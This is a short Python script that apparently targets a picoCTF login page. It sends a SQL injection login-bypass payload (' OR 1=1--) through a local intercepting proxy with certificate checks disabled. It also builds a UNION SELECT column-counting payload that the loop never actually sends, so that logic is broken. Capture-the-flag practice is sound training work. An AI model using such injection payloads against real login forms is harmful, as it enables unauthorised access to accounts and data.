from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "admin' OR 1=1 UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.post(
            URL,
            data="username=admin" + quote("' OR 1=1--") + "&password=admin&debug=1",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        print(response.text)
        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "http://saturn.picoctf.net:56554/login.php"
    print(get_col_nums(URL, 100))


if __name__ == "__main__":
    main()
